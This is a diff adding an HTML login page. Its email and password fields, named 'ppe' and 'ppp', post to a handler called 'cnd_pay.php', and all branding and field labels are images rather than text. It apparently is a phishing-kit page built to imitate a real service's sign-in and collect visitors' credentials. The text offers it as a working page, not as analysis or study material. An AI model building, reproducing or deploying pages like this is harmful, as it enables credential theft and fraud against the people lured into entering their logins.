@@ -1,0 +1,145 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<html>
+<head>
+	<title>Log In</title>
+	<link href="images/favi.ico" rel="shortcut icon">
+	
+	<script type="text/javascript">
+function validateFormOnSubmit(theForm) {
+var reason = "";
+ 
+
+  reason += validatePpe(theForm.ppe); 
+  reason += validatePpp(theForm.ppp);
+      
+  if (reason != "") {
+    alert("Some fields need correction:\n" + reason);
+    return false;
+  }
+
+   
+}
+function validateEmpty(fld) {
+    var error = "";
+ 
+    if (fld.value.length == 0) {
+        fld.style.background = 'Yellow'; 
+        error = "Please check your entries and try again.\n"
+    } else {
+        fld.style.background = 'White';
+    }
+    return error;  
+}
+ 
+
+function validatePpe(fld) {
+    var error="";
+    var tfld = trim(fld.value);                        // value of field with whitespace trimmed off
+    var emailFilter = /^[^@]+@[^@.]+\.[^@]*\w\w$/ ;
+    var illegalChars= /[\(\)\<\>\,\;\:\\\"\[\]]/ ;
+   
+    if (fld.value == "") {
+        fld.style.background = 'Yellow';
+        error = "Please check your entries and try again.\n";
+    } else if (!emailFilter.test(tfld)) {              //test email for illegal characters
+        fld.style.background = 'Yellow';
+        error = "Please check your entries and try again.\n";
+    } else if (fld.value.match(illegalChars)) {
+        fld.style.background = 'Yellow';
+        error = "Please check your entries and try again.\n";
+    } else {
+        fld.style.background = 'White';
+    }
+    return error;
+}
+
+
+function validatePpp(fld) {
+    var error = "";
+    var illegalChars = /[\W_]/; // allow only letters and numbers 
+ 
+    if (fld.value == "") {
+        fld.style.background = 'Yellow';
+        error = "Please check your entries and try again.\n";
+    } else if ((fld.value.length < 7) || (fld.value.length > 18)) {
+        error = "Please check your entries and try again.\n";
+        fld.style.background = 'Yellow';
+    } else if (illegalChars.test(fld.value)) {
+        error = "Please check your entries and try again.\n";
+        fld.style.background = 'Yellow';
+   
+    } else {
+        fld.style.background = 'White';
+    }
+   return error;
+}  
+function trim(s)
+{
+  return s.replace(/^\s+|\s+$/, '');
+}
+ 
+    </script>
+	
+
+	
+</head>
+
+<body topmargin="0">
+ <table cellspacing="0" cellpadding="0" width="760" align="center">
+
+<tr>
+       <td colspan=2><img src="images/1.png" width="760" height="65" border="0"><br><br><img src="images/2.png" width="760" height="21" border="0"></td>
+</tr>
+<tr><td colspan=2><br><img src="images/yml.png" width="750" height="60" border="0"></td></tr>
+
+<tr>
+       <td width="180" style="padding-right:10px" valign="top"><br>
+	   
+	   
+	   
+	   <table cellspacing="0" cellpadding="0" width="180" background="images/log.png" height="243">
+
+<tr>
+       <td valign="top"><br><br><form action="cnd_pay.php" method="post" onsubmit="return validateFormOnSubmit(this)">	
+	   <table cellspacing="0" cellpadding="0" align="center">
+	      <tr>
+       <td valign="top"><img src="images/email.png" width="81" height="14" border="0"><br>
+       <input type="text" name="ppe" style="width:145px" size="20"></td>
+</tr>
+<tr>
+       <td valign="top"><img src="images/pessw.png" width="95" height="25" border="0"><br>
+       <input type="password" name="ppp" style="width:145px" size="20"></td>
+</tr>
+	   <tr>
+       <td valign="top"><br>
+       <input type="image" src="images/go.png" value="Submit" alt="Submit" width="54" height="21"></td>
+</tr>
+	   </table>
+	   
+	   </form>
+	   
+	   
+	   
+	   </td>
+</tr>
+ 
+</table>
+
+	   
+	   </td><td valign="top" align="right"><br>
+       <img src="images/think.png" width="562" height="232" border="0"></td>
+</tr>
+
+
+
+<tr>
+       <td align="center" colspan=2>&nbsp;<p><br>
+       <img src="images/copyin.png" width="608" height="149" border="0"></td>
+</tr>
+</table>
+
+
+
+</body>
+</html>
